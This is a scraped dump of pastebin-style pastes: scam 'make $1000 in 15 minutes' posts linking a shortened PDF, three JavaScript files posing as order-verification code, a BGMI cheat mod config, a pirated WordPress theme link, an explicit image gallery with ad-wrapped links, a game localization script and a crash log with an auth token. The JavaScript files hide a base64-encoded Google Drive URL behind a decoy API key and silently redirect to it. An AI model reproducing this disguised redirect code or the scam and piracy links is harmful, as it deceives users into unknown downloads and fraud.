id,title,username,language,date,content
JE6muK9Z,Make $1000 15-MINUTES (BEGINNER) FM,jasvan4,JavaScript,Friday 11th of April 2025 12:59:25 AM CDT," 
Pdf https://tinyurl.com/privguidee


8TLJR0DuXm
"
SLAKp89z,EARN $900 INSTANTLY 2025‚≠ê G8,jasvan4,JavaScript,Friday 11th of April 2025 12:45:59 AM CDT," 
Pdf https://tinyurl.com/privguidee


niJnXzFyUa
"
k0RLVcGA,Make $1000 15-MINUTES  (BEGINNER) HV,jasvan4,JavaScript,Friday 11th of April 2025 12:32:33 AM CDT," 
Pdf https://tinyurl.com/privguidee


8IEyQKjwm9
"
qE8VdUe1,bgmi.json,Jagdeep403,JSON,Friday 11th of April 2025 12:22:48 AM CDT,"{
  ""sections"": [
    {
      ""items"": [
        {
          ""description"": ""Nusa"",
          ""downloadLink"": ""https://example.com/downloads/ultra_graphics.pak"",
          ""filename"": ""NG_NuSA.zip"",
          ""id"": ""ng_nusa"",
          ""isAvailable"": true,
          ""needPakCopy"": true,
          ""needPufferCopy"": true,
          ""needSavCopy"": false,
          ""pakPath"": ""/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/GameFeature/"",
          ""pufferPath"": ""/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/puffer_temp/"",
          ""savPath"": """",
          ""title"": ""No Grass""
        },
        {
          ""description"": ""f"",
          ""downloadLink"": ""f"",
          ""filename"": ""f"",
          ""id"": ""2v92q0487"",
          ""isAvailable"": false,
          ""needPakCopy"": false,
          ""needPufferCopy"": true,
          ""needSavCopy"": false,
          ""pakPath"": """",
          ""pufferPath"": ""f"",
          ""savPath"": """",
          ""title"": ""f""
        }
      ],
      ""title"": ""No Grass""
    },
    {
      ""title"": ""dddd"",
      ""items"": []
    }
  ]
}"
mY36hGLr,EARN $900 INSTANTLY 2025 2U,jasvan4,JavaScript,Friday 11th of April 2025 12:19:08 AM CDT," 
Pdf https://tinyurl.com/privguidee


WipBuuYc6F
"
MJhmLL2M,CK3 fake translation 2,anon_user_007,PowerShell,Friday 11th of April 2025 12:17:54 AM CDT,"# Function to determine the file encoding by BOM
function Get-FileEncoding {
    param (
        [string]$Path
    )
    $fs = [System.IO.File]::OpenRead($Path)
    $bom = New-Object byte[] 4
    $fs.Read($bom, 0, 4) | Out-Null
    $fs.Close()

    if ($bom[0] -eq 0xEF -and $bom[1] -eq 0xBB -and $bom[2] -eq 0xBF) {
        return [System.Text.Encoding]::UTF8
    }
    elseif ($bom[0] -eq 0xFF -and $bom[1] -eq 0xFE) {
        return [System.Text.Encoding]::Unicode
    }
    elseif ($bom[0] -eq 0xFE -and $bom[1] -eq 0xFF) {
        return [System.Text.Encoding]::BigEndianUnicode
    }
    else {
        # If BOM is not found, return UTF8 by default
        return [System.Text.Encoding]::UTF8
    }
}

# Function for recursive renaming of files and folders (replace $srcLang with $dstLang)
function Rename-LocalizationItems ($path, $pattern, $replacement) {
    # First, rename files in the current directory
    Get-ChildItem -Path $path -File | ForEach-Object {
        if ($_.Name -match $pattern) {
            $newName = $_.Name -replace $pattern, $replacement
            Rename-Item -Path $_.FullName -NewName $newName -Force
            Write-Host ""Renamed file: $(Join-Path $_.DirectoryName $newName)""
        }
    }
    # Then, process subdirectories recursively
    Get-ChildItem -Path $path -Directory | ForEach-Object {
        Rename-LocalizationItems -path $_.FullName -pattern $pattern -replacement $replacement
        if ($_.Name -match $pattern) {
            $newName = $_.Name -replace $pattern, $replacement
            $parent = Split-Path $_.FullName -Parent
            Rename-Item -Path $_.FullName -NewName $newName -Force
            Write-Host ""Renamed folder: $(Join-Path $parent $newName)""
        }
    }
}

# Define source and target localization languages for checking
$srcLang = ""english""
$dstLang = ""russian""

# Paths for folders and files
$modsFolder   = ""D:\Games\SteamLibrary\steamapps\workshop\content\1158310""
$launcherDb   = ""C:\Users\$env:USERNAME\Documents\Paradox Interactive\Crusader Kings III\launcher-v2.sqlite""
$sqlite3Path  = ""D:\mods\Cursader Kings 3\sqlite-tools-win-x64-3490100\sqlite3.exe""
$destRoot     = ""C:\Users\$env:USERNAME\Documents\Paradox Interactive\Crusader Kings III\mod""

# Check if required files exist
if (!(Test-Path $sqlite3Path)) {
    Write-Host ""ERROR: sqlite3.exe not found at: $sqlite3Path"" -ForegroundColor Red
    exit
}
if (!(Test-Path $launcherDb)) {
    Write-Host ""ERROR: launcher-v2.sqlite not found at: $launcherDb"" -ForegroundColor Red
    exit
}

# Create a backup of the database
$timestamp  = Get-Date -Format ""yyyyMMddHHmmss""
$backupPath = ""$launcherDb.$timestamp""
Copy-Item -Path $launcherDb -Destination $backupPath -Force
Write-Host ""Database backup created: $backupPath""

# Get data from the database via sqlite3 (CSV output)
$query = ""SELECT ps.name AS playsetName, psm.position, m.displayName, m.steamId 
          FROM playsets ps 
          JOIN playsets_mods psm ON ps.id = psm.playsetId 
          JOIN mods m ON psm.modId = m.id 
          WHERE ps.isActive = 1 AND psm.enabled = 1 
          ORDER BY psm.position;""
$csvOutput = & $sqlite3Path $launcherDb "".headers on"" "".mode csv"" $query
$modData   = $csvOutput | ConvertFrom-Csv

Write-Host ""Data retrieved from database (only active mods):"" -ForegroundColor Cyan
$modData | Format-Table -AutoSize

# For each mod, identify the localization folder
foreach ($mod in $modData) {
    $modFolder = Join-Path $modsFolder $mod.steamId
    if (Test-Path $modFolder) {
        # Add mod folder path and its file list to the object
        $mod | Add-Member -MemberType NoteProperty -Name ModFolder -Value $modFolder -Force
        $locRoot = Join-Path $modFolder ""localization""
        if (Test-Path $locRoot) {
            $mod | Add-Member -MemberType NoteProperty -Name LocalizationRoot -Value $locRoot -Force
            # Get all files under the localization folder recursively
            $files = Get-ChildItem -Path $locRoot -Recurse -File
            $mod | Add-Member -MemberType NoteProperty -Name LocalizationFiles -Value $files -Force
        }
    }
    else {
        Write-Host ""Mod folder not found: $modFolder"" -ForegroundColor Yellow
    }
}

# Gather missing localization files
# For each mod, under the localization folder, check: for every file whose name contains $srcLang,
# determine the expected file path with $srcLang replaced by $dstLang. If such a file does not exist, mark it as missing.
$modsMissingLocalization = @()

foreach ($mod in $modData) {
    if ($mod.LocalizationRoot -and $mod.LocalizationFiles) {
        $locRoot = $mod.LocalizationRoot
        $missingFiles = @()
        # Select files whose names contain ""english""
        $englishFiles = $mod.LocalizationFiles | Where-Object { $_.Name -like ""*$srcLang*"" }
        foreach ($file in $englishFiles) {
            # Get relative path with respect to the localization folder
            $relativePath = $file.FullName.Substring($locRoot.Length + 1)
            # Compute the expected relative path replacing ""english"" with ""russian""
            $expectedRelativePath = $relativePath -replace $srcLang, $dstLang
            $expectedFullPath = Join-Path $locRoot $expectedRelativePath
            if (-not (Test-Path $expectedFullPath)) {
                $missingFiles += [PSCustomObject]@{
                    RelativePath = $relativePath
                    SourceFile   = $file.FullName
                    ExpectedPath = $expectedFullPath
                }
            }
        }
        if ($missingFiles.Count -gt 0) {
            $modsMissingLocalization += [PSCustomObject]@{
                ModDisplayName   = $mod.displayName
                SteamId          = $mod.steamId
                LocalizationRoot = $locRoot
                MissingFiles     = $missingFiles
            }
        }
    }
}

# Display the list of mods with missing (or incomplete) localization ($dstLang)
Write-Host ""Mods with missing (or incomplete) localization ($dstLang):"" -ForegroundColor Cyan
if ($modsMissingLocalization.Count -gt 0) {
    $modsMissingLocalization | Format-Table ModDisplayName, SteamId, @{Name=""Missing Files""; Expression={ $_.MissingFiles.Count } } -AutoSize
} else {
    Write-Host ""No mods with missing localization for language '$dstLang' found.""
}

# Process each mod: remove old mod folders and .mod files, then create new ones and copy missing files
foreach ($mod in $modsMissingLocalization) {
    $steamId = $mod.SteamId
    $destModFolder = Join-Path $destRoot $steamId

    # If the mod folder already exists, remove it along with its contents
    if (Test-Path $destModFolder) {
        Remove-Item -Path $destModFolder -Recurse -Force
        Write-Host ""Existing mod folder removed: $destModFolder""
    }
    # If a .mod file exists, remove it
    $modFilePath = Join-Path $destRoot (""$steamId.mod"")
    if (Test-Path $modFilePath) {
        Remove-Item -Path $modFilePath -Force
        Write-Host ""Existing mod file removed: $modFilePath""
    }
    # Create a new folder for the mod
    New-Item -ItemType Directory -Path $destModFolder -Force | Out-Null

    # For each missing file, copy the original file while preserving the relative structure to the localization folder
    foreach ($fileInfo in $mod.MissingFiles) {
        # Build the destination path: in the new mod folder create a 'localization' folder and append the file's relative path
        $destLocalizationBase = Join-Path $destModFolder ""localization""
        $destFilePath = Join-Path $destLocalizationBase $fileInfo.RelativePath
        $destDir = Split-Path $destFilePath -Parent
        if (!(Test-Path $destDir)) {
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        }
        Copy-Item -Path $fileInfo.SourceFile -Destination $destFilePath -Force
        Write-Host ""File copied: $destFilePath""

        # Replace file content: change ""l_english:"" to ""l_russian:"" while preserving the original encoding
        $origEncoding = Get-FileEncoding -Path $destFilePath
        $content = Get-Content $destFilePath -Raw
        $updatedContent = $content -replace ""l_${srcLang}:"", ""l_${dstLang}:""
        [System.IO.File]::WriteAllText($destFilePath, $updatedContent, $origEncoding)
        Write-Host ""Processed file (content replaced): $destFilePath""
    }

    # Rename files and folders in the copied localization folder:
    # Replace ""english"" with ""russian"" in file and folder names
    $destLocalizationRoot = Join-Path $destModFolder ""localization""
    Rename-LocalizationItems -path $destLocalizationRoot -pattern $srcLang -replacement $dstLang

    # Create descriptor.mod file inside the mod folder
    $descriptorContent = @""
version=""1.*""
tags={
    ""Translation""
}
name=""$($mod.ModDisplayName) [fake $dstLang]""
supported_version=""1.*""
""@
    $descriptorPath = Join-Path $destModFolder ""descriptor.mod""
    [System.IO.File]::WriteAllText($descriptorPath, $descriptorContent, [System.Text.Encoding]::UTF8)
    Write-Host ""Created descriptor.mod for mod $($mod.ModDisplayName) (SteamId: $steamId)""

    # Create the .mod file in the root of $destRoot
    $destModPath = (Join-Path $destRoot $steamId) -replace ""\\"", ""/""
    $modFileContent = @""
version=""1.*""
tags={
    ""Translation""
}
name=""$($mod.ModDisplayName) [fake $dstLang]""
supported_version=""1.*""
path=""$destModPath""
""@
    $modFilePath = Join-Path $destRoot (""$steamId.mod"")
    [System.IO.File]::WriteAllText($modFilePath, $modFileContent, [System.Text.Encoding]::UTF8)
    Write-Host ""Created file $steamId.mod for mod $($mod.ModDisplayName) (SteamId: $steamId)""
}"
kn57HJEm,Mens only (Apr 11 2025),MarcSpencer,HTML,Friday 11th of April 2025 12:02:22 AM CDT,"Daniel Evans and Vincent Grey
<a href=""https://fappic.com/e9o5gv7jfise/next-door-studios-daniel-evans-and-vincent-grey-001.jpg""><img src=""https://img103.fappic.com/i/03914/e9o5gv7jfise_t.jpg""></a><a href=""https://fappic.com/nmaas61m3myd/next-door-studios-daniel-evans-and-vincent-grey-002.jpg""><img src=""https://img103.fappic.com/i/03914/nmaas61m3myd_t.jpg""></a><a href=""https://fappic.com/7k5ub5cb734n/next-door-studios-daniel-evans-and-vincent-grey-003.jpg""><img src=""https://img103.fappic.com/i/03914/7k5ub5cb734n_t.jpg""></a><a href=""https://fappic.com/z8dgd7sx3so5/next-door-studios-daniel-evans-and-vincent-grey-004.jpg""><img src=""https://img103.fappic.com/i/03914/z8dgd7sx3so5_t.jpg""></a><a href=""https://fappic.com/5owcdet82e1d/next-door-studios-daniel-evans-and-vincent-grey-005.jpg""><img src=""https://img103.fappic.com/i/03914/5owcdet82e1d_t.jpg""></a><a href=""https://fappic.com/xy1xs2pc6jtn/next-door-studios-daniel-evans-and-vincent-grey-006.jpg""><img src=""https://img103.fappic.com/i/03914/xy1xs2pc6jtn_t.jpg""></a><a href=""https://fappic.com/vmp2qcp5tl8w/next-door-studios-daniel-evans-and-vincent-grey-007.jpg""><img src=""https://img103.fappic.com/i/03914/vmp2qcp5tl8w_t.jpg""></a><a href=""https://fappic.com/0hzkbe7sugqu/next-door-studios-daniel-evans-and-vincent-grey-008.jpg""><img src=""https://img103.fappic.com/i/03914/0hzkbe7sugqu_t.jpg""></a><a href=""https://fappic.com/lp9j3lf05j3g/next-door-studios-daniel-evans-and-vincent-grey-009.jpg""><img src=""https://img103.fappic.com/i/03914/lp9j3lf05j3g_t.jpg""></a><a href=""https://fappic.com/nbauohr4gvpo/next-door-studios-daniel-evans-and-vincent-grey-010.jpg""><img src=""https://img103.fappic.com/i/03914/nbauohr4gvpo_t.jpg""></a><a href=""https://fappic.com/dpsclnlhfu8m/next-door-studios-daniel-evans-and-vincent-grey-011.jpg""><img src=""https://img103.fappic.com/i/03914/dpsclnlhfu8m_t.jpg""></a><a href=""https://fappic.com/yu2zn0x1x1ot/next-door-studios-daniel-evans-and-vincent-grey-012.jpg""><img src=""https://img103.fappic.com/i/03914/yu2zn0x1x1ot_t.jpg""></a><a href=""https://fappic.com/u7pic5ppviag/next-door-studios-daniel-evans-and-vincent-grey-013.jpg""><img src=""https://img103.fappic.com/i/03914/u7pic5ppviag_t.jpg""></a><a href=""https://fappic.com/67mcyrzzp4u6/next-door-studios-daniel-evans-and-vincent-grey-014.jpg""><img src=""https://img103.fappic.com/i/03914/67mcyrzzp4u6_t.jpg""></a><a href=""https://fappic.com/dm0yuun2ug0n/next-door-studios-daniel-evans-and-vincent-grey-015.jpg""><img src=""https://img103.fappic.com/i/03914/dm0yuun2ug0n_t.jpg""></a>

Evan pounds Rocky 
<a href=""https://fappic.com/csbd4nb8ph0i/corbin-fisher-evan-pounds-rocky-001.jpg""><img src=""https://img103.fappic.com/i/03914/csbd4nb8ph0i_t.jpg""></a><a href=""https://fappic.com/nvi6mo18h2a4/corbin-fisher-evan-pounds-rocky-002.jpg""><img src=""https://img103.fappic.com/i/03914/nvi6mo18h2a4_t.jpg""></a><a href=""https://fappic.com/3cahpe5qvp6v/corbin-fisher-evan-pounds-rocky-003.jpg""><img src=""https://img103.fappic.com/i/03914/3cahpe5qvp6v_t.jpg""></a><a href=""https://fappic.com/z8cvpgcs50z0/corbin-fisher-evan-pounds-rocky-004.jpg""><img src=""https://img103.fappic.com/i/03914/z8cvpgcs50z0_t.jpg""></a><a href=""https://fappic.com/h0ni7gdyk5u1/corbin-fisher-evan-pounds-rocky-005.jpg""><img src=""https://img103.fappic.com/i/03914/h0ni7gdyk5u1_t.jpg""></a><a href=""https://fappic.com/8bee6wrzeh3s/corbin-fisher-evan-pounds-rocky-006.jpg""><img src=""https://img103.fappic.com/i/03914/8bee6wrzeh3s_t.jpg""></a><a href=""https://fappic.com/3vrtfwh0sgcl/corbin-fisher-evan-pounds-rocky-007.jpg""><img src=""https://img103.fappic.com/i/03915/3vrtfwh0sgcl_t.jpg""></a><a href=""https://fappic.com/lftwfssfh9xr/corbin-fisher-evan-pounds-rocky-008.jpg""><img src=""https://img103.fappic.com/i/03915/lftwfssfh9xr_t.jpg""></a><a href=""https://fappic.com/bu8w7w9x3h5x/corbin-fisher-evan-pounds-rocky-009.jpg""><img src=""https://img103.fappic.com/i/03915/bu8w7w9x3h5x_t.jpg""></a><a href=""https://fappic.com/bdzbouu8haku/corbin-fisher-evan-pounds-rocky-010.jpg""><img src=""https://img103.fappic.com/i/03915/bdzbouu8haku_t.jpg""></a><a href=""https://fappic.com/l7xx87tl1g0q/corbin-fisher-evan-pounds-rocky-011.jpg""><img src=""https://img103.fappic.com/i/03915/l7xx87tl1g0q_t.jpg""></a><a href=""https://fappic.com/gi00q4e6t90j/corbin-fisher-evan-pounds-rocky-012.jpg""><img src=""https://img103.fappic.com/i/03915/gi00q4e6t90j_t.jpg""></a><a href=""https://fappic.com/ii83vmtlyxbz/corbin-fisher-evan-pounds-rocky-013.jpg""><img src=""https://img103.fappic.com/i/03915/ii83vmtlyxbz_t.jpg""></a><a href=""https://fappic.com/goamdtnyb6px/corbin-fisher-evan-pounds-rocky-014.jpg""><img src=""https://img103.fappic.com/i/03915/goamdtnyb6px_t.jpg""></a><a href=""https://fappic.com/pkkmtg79gc3l/corbin-fisher-evan-pounds-rocky-015.jpg""><img src=""https://img103.fappic.com/i/03915/pkkmtg79gc3l_t.jpg""></a><a href=""https://fappic.com/cjpz6f5bbr8w/corbin-fisher-evan-pounds-rocky-016.jpg""><img src=""https://img103.fappic.com/i/03915/cjpz6f5bbr8w_t.jpg""></a><a href=""https://fappic.com/gpadgqv473pb/corbin-fisher-evan-pounds-rocky-017.jpg""><img src=""https://img103.fappic.com/i/03915/gpadgqv473pb_t.jpg""></a><a href=""https://fappic.com/2pfryq6rbq9r/corbin-fisher-evan-pounds-rocky-018.jpg""><img src=""https://img103.fappic.com/i/03915/2pfryq6rbq9r_t.jpg""></a>

Alex Kof and Jace Starr 
<a href=""https://u-z7sqhgb7t7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/dbu3sd11wov7_t.jpg""></a><a href=""https://u-57sqhgcls7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/twhmanmoeiwu_t.jpg""></a><a href=""https://u-i7sqhgducj.urlcash.net""><img src=""https://img103.fappic.com/i/03914/vbk5i1ubsfc0_t.jpg""></a><a href=""https://u-67sqhgenei.urlcash.net""><img src=""https://img103.fappic.com/i/03914/x9clkjp5omw5_t.jpg""></a><a href=""https://u-v7sqhgftgv.urlcash.net""><img src=""https://img103.fappic.com/i/03914/og96zwolfq2o_t.jpg""></a><a href=""https://u-p7sqhggb5h.urlcash.net""><img src=""https://img103.fappic.com/i/03914/ldj7c1gqs3f1_t.jpg""></a><a href=""https://u-n7sqhghcw7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/bmx2jxn9npkz_t.jpg""></a><a href=""https://u-77sqhgimdl.urlcash.net""><img src=""https://img103.fappic.com/i/03914/53ddj1el8vhf_t.jpg""></a><a href=""https://u-m7sqhg0tuk.urlcash.net""><img src=""https://img103.fappic.com/i/03914/gpdemj8ddgi8_t.jpg""></a><a href=""https://u-07sqhg1b2k.urlcash.net""><img src=""https://img103.fappic.com/i/03914/uandb3xfn0kb_t.jpg""></a><a href=""https://u-x7sqhg2j10.urlcash.net""><img src=""https://img103.fappic.com/i/03914/o8j6ujaqrwo4_t.jpg""></a><a href=""https://u-m7sqhg3v15.urlcash.net""><img src=""https://img103.fappic.com/i/03914/d7nl75n2qu68_t.jpg""></a><a href=""https://u-m7sqhg4020.urlcash.net""><img src=""https://img103.fappic.com/i/03914/k4fw83hz5ztz_t.jpg""></a><a href=""https://u-c7sqhg5tyl.urlcash.net""><img src=""https://img103.fappic.com/i/03914/jote3eo98w0n_t.jpg""></a><a href=""https://u-v7sqhg6zjk.urlcash.net""><img src=""https://img103.fappic.com/i/03914/pysrvt09l68w_t.jpg""></a><a href=""https://u-m7sqhg76vm.urlcash.net""><img src=""https://img103.fappic.com/i/03914/tjtmzhe8godu_t.jpg""></a><a href=""https://u-l7sqhg871c.urlcash.net""><img src=""https://img103.fappic.com/i/03914/bfftk5ywskku_t.jpg""></a><a href=""https://u-47sqhg9hnx.urlcash.net""><img src=""https://img103.fappic.com/i/03914/wlk6ko09ibwp_t.jpg""></a><a href=""https://u-a7sqhgjbee.urlcash.net""><img src=""https://img103.fappic.com/i/03914/6ek59czblkb6_t.jpg""></a>

Arno Antino and Seth Cain
<a href=""https://u-v7sqhglghg.urlcash.net""><img src=""https://img103.fappic.com/i/03914/mehpp2mo89v8_t.jpg""></a><a href=""https://u-z7sqhgmhja.urlcash.net""><img src=""https://img103.fappic.com/i/03914/puzvfg9i55ie_t.jpg""></a><a href=""https://u-47sqhgnsyx.urlcash.net""><img src=""https://img103.fappic.com/i/03914/9vdjsk88lr78_t.jpg""></a><a href=""https://u-b7sqhgoiho.urlcash.net""><img src=""https://img103.fappic.com/i/03914/fo2n922vh7cb_t.jpg""></a><a href=""https://u-77sqhgp73b.urlcash.net""><img src=""https://img103.fappic.com/i/03914/8vn4pv558zuu_t.jpg""></a><a href=""https://u-b7sqhgqx7d.urlcash.net""><img src=""https://img103.fappic.com/i/03914/aknohium8uhi_t.jpg""></a><a href=""https://u-i7sqhgrql0.urlcash.net""><img src=""https://img103.fappic.com/i/03914/6n66p6t6utmh_t.jpg""></a><a href=""https://u-37sqhgsbjd.urlcash.net""><img src=""https://img103.fappic.com/i/03914/1gr78zc6elsy_t.jpg""></a><a href=""https://u-u7sqhgtd5a.urlcash.net""><img src=""https://img103.fappic.com/i/03914/w247n7tclm2s_t.jpg""></a><a href=""https://u-z7sqhgupr5.urlcash.net""><img src=""https://img103.fappic.com/i/03914/w5zrgmagcsyn_t.jpg""></a><a href=""https://u-57sqhgv3kg.urlcash.net""><img src=""https://img103.fappic.com/i/03914/le0o7bfiyraa_t.jpg""></a><a href=""https://u-b7sqhgwfv6.urlcash.net""><img src=""https://img103.fappic.com/i/03914/yekrtu7hu84w_t.jpg""></a><a href=""https://u-z7sqhgxiir.urlcash.net""><img src=""https://img103.fappic.com/i/03914/pm2obxgj12lx_t.jpg""></a><a href=""https://u-m7sqhhahvl.urlcash.net""><img src=""https://img103.fappic.com/i/03914/v5gsrzsqjqyd_t.jpg""></a><a href=""https://u-s7sqhhb27b.urlcash.net""><img src=""https://img103.fappic.com/i/03914/dxxg3ex7geb4_t.jpg""></a><a href=""https://u-b7sqhhcges.urlcash.net""><img src=""https://img103.fappic.com/i/03914/7utqdbl7jb9j_t.jpg""></a><a href=""https://u-37sqhhdtrq.urlcash.net""><img src=""https://img103.fappic.com/i/03914/kv9rzzadq8vu_t.jpg""></a>
"
j63EUS3r,Wordpress Multi Purpose,andhiirawan,PHP,Thursday 10th of April 2025 11:26:20 PM CDT,"https://weadown.com/res/uomo-wordpress-theme/
https://demoapus-wp.com/landing-page/uomo/"
JkvhEQYK,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 11:26:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80151/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NgPQGA0A,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 11:10:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vg3kthba,Market.js,WassupDog45,JavaScript,Thursday 10th of April 2025 10:55:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22943/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cPMRtTDz,2025-04-11T08:40:51.635513,powerampache,PHP,Thursday 10th of April 2025 10:40:52 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":85},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":310938959,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d363a26e599f5477fcb1c8b1f466e233f\u0026type\u003dsong\u0026id\u003d4570"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the 